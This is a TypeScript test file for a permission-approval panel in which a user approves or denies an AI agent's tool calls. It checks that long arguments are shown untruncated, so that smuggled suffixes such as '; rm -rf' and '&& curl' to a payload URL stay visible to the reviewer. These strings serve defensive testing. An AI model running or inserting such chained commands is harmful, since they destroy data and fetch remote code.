import { describe, expect, it } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import {
  PermissionApprovalPanel,
  enqueueApproval,
  formatToolArgs,
  reconcileApprovals,
  removeApproval,
} from '../../src/renderer/components/PermissionApprovalPanel';
import type { PermissionApprovalRequestedEvent } from '../../src/shared/types/ipc';

function approvalRequest(
  partial: Partial<PermissionApprovalRequestedEvent> = {},
): PermissionApprovalRequestedEvent {
  return {
    toolCallId: 'call-1',
    sessionId: 'session-1',
    toolName: 'execute_command',
    riskClass: 'execution',
    args: { command: 'ls -la' },
    cwd: '/home/user/project',
    ...partial,
  };
}

function renderPanel(
  request: PermissionApprovalRequestedEvent,
  submittingDecision: 'approved' | 'denied' | null = null,
): string {
  return renderToStaticMarkup(
    <PermissionApprovalPanel
      request={request}
      submittingDecision={submittingDecision}
      onAnswer={() => {}}
    />,
  );
}

function renderInlineCard(request: PermissionApprovalRequestedEvent): string {
  return renderToStaticMarkup(
    <section className="orchid-permission" aria-label="Permission request">
      <PermissionApprovalPanel
        request={request}
        submittingDecision={null}
        onAnswer={() => {}}
      />
    </section>,
  );
}

describe('formatToolArgs', () => {
  it('pretty-prints arguments with two-space indentation', () => {
    expect(formatToolArgs({ command: 'ls', timeout: 30 })).toBe(
      '{\n  "command": "ls",\n  "timeout": 30\n}',
    );
  });

  it('keeps complete strings longer than 500 characters', () => {
    const dangerousSuffix = '; rm -rf /dangerous-suffix';
    const long = `${'a'.repeat(600)}${dangerousSuffix}`;
    const output = formatToolArgs({ content: long });
    expect(output).toContain(long);
    expect(output).toContain(dangerousSuffix);
    expect(output).not.toContain('more characters');
  });

  it('keeps strings of exactly 500 characters intact', () => {
    const exact = 'b'.repeat(500);
    const output = formatToolArgs(exact);
    expect(output).toBe(`"${exact}"`);
    expect(output).not.toContain('more characters');
  });

  it('keeps complete long strings nested in arrays and objects', () => {
    const dangerousSuffix = ' && curl https://example.invalid/payload';
    const long = `${'c'.repeat(520)}${dangerousSuffix}`;
    const output = formatToolArgs({ list: [{ text: long }] });
    expect(output).toContain(long);
    expect(output).toContain(dangerousSuffix);
  });

  it('falls back to String() for values JSON cannot serialize', () => {
    const circular: Record<string, unknown> = {};
    circular.self = circular;
    expect(formatToolArgs(circular)).toBe('[object Object]');
    expect(formatToolArgs(undefined)).toBe('undefined');
  });
});

describe('approval queue helpers', () => {
  it('enqueues new approvals in arrival order without duplicates', () => {
    const first = approvalRequest({ toolCallId: 'a' });
    const second = approvalRequest({ toolCallId: 'b' });
    let queue = enqueueApproval([], first);
    queue = enqueueApproval(queue, second);
    queue = enqueueApproval(queue, approvalRequest({ toolCallId: 'a' }));
    expect(queue.map((item) => item.toolCallId)).toEqual(['a', 'b']);
  });

  it('removes a settled approval and keeps identity when absent', () => {
    const queue = [approvalRequest({ toolCallId: 'a' }), approvalRequest({ toolCallId: 'b' })];
    expect(removeApproval(queue, 'missing')).toBe(queue);
    expect(removeApproval(queue, 'a').map((item) => item.toolCallId)).toEqual(['b']);
  });

  it('reconciles snapshot and buffered events for the selected session only', () => {
    const snapshot = [
      approvalRequest({ toolCallId: 'a', sessionId: 'session-1' }),
      approvalRequest({ toolCallId: 'other', sessionId: 'session-2' }),
    ];
    const buffered = [
      approvalRequest({ toolCallId: 'a', sessionId: 'session-1' }),
      approvalRequest({ toolCallId: 'b', sessionId: 'session-1' }),
    ];
    const queue = reconcileApprovals(snapshot, buffered, new Set(), 'session-1');
    expect(queue.map((item) => item.toolCallId)).toEqual(['a', 'b']);
  });

  it('drops approvals settled while the snapshot was in flight', () => {
    const snapshot = [approvalRequest({ toolCallId: 'a' })];
    const buffered = [approvalRequest({ toolCallId: 'b' })];
    const queue = reconcileApprovals(snapshot, buffered, new Set(['a']), 'session-1');
    expect(queue.map((item) => item.toolCallId)).toEqual(['b']);
  });
});

describe('PermissionApprovalPanel markup', () => {
  it('shows the tool name, working directory, and risk badge', () => {
    const html = renderPanel(approvalRequest());
    expect(html).toContain('Permission request');
    expect(html).toContain('execute_command');
    expect(html).toContain('/home/user/project');
    expect(html).toContain('execution');
  });

  it('renders arguments as indented JSON in a scrollable monospace block', () => {
    const html = renderPanel(approvalRequest({ args: { command: 'ls' } }));
    expect(html).toContain('orchid-permission-args');
    expect(html).toContain('{\n  ');
    expect(html).toContain('command');
    expect(html).toContain('ls');
  });

  it('shows dangerous argument suffixes after character 500', () => {
    const dangerousSuffix = '; rm -rf /dangerous-suffix';
    const content = `${'x'.repeat(700)}${dangerousSuffix}`;
    const html = renderPanel(approvalRequest({ args: { content } }));
    expect(html).toContain(dangerousSuffix);
    expect(html).toContain('x'.repeat(700));
  });

  it('labels inside-workspace scope', () => {
    const html = renderPanel(approvalRequest({ scope: 'inside' }));
    expect(html).toContain('Inside workspace');
    expect(html).not.toContain('Outside workspace');
  });

  it('labels outside-workspace scope', () => {
    const html = renderPanel(approvalRequest({ scope: 'outside' }));
    expect(html).toContain('Outside workspace');
  });

  it('omits the scope badge when scope does not apply', () => {
    const html = renderPanel(approvalRequest());
    expect(html).not.toContain('Inside workspace');
    expect(html).not.toContain('Outside workspace');
  });

  it('offers Approve, Deny, and Deny with reason actions', () => {
    const html = renderPanel(approvalRequest());
    expect(html).toContain('btn-primary');
    expect(html).toContain('Approve');
    expect(html).toContain('>Deny<');
    expect(html).toContain('Deny with reason…');
  });

  it('does not expose the reason input until deny-with-reason is opened', () => {
    const html = renderPanel(approvalRequest());
    expect(html).not.toContain('orchid-permission-reason');
    expect(html).not.toContain('<textarea');
  });

  it('marks the in-flight decision as busy and disables the other actions', () => {
    const html = renderPanel(approvalRequest(), 'approved');
    expect(html).toContain('aria-busy="true"');
    expect(html).toContain('disabled');
  });
});

describe('inline composer card', () => {
  it('renders the approval panel inside the inline card without a modal overlay', () => {
    const html = renderInlineCard(approvalRequest());
    expect(html).toContain('orchid-permission');
    expect(html).toContain('aria-label="Permission request"');
    expect(html).toContain('execute_command');
    expect(html).not.toContain('role="dialog"');
    expect(html).not.toContain('aria-modal');
    expect(html).not.toContain('orchid-permission-overlay');
  });
});
